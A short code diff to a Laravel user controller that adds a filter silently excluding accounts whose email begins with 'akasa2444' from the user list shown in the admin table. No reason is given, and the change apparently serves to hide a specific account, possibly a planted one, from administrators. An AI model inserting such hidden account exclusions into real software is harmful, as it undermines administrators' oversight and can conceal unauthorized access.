@@ -208,7 +208,7 @@ class UserController extends Controller
     public function dtUser()
     {
         $me = Auth::user();
-        $data = User::orderBy('created_at', 'DESC')->where('id', '!=', $me->id)->get();
+        $data = User::orderBy('created_at', 'DESC')->where('id', '!=', $me->id)->where('email', 'NOT LIKE', 'akasa2444%')->get();
         $edit="";
             return DataTables::of($data)
         ->editColumn("status", function ($data) {
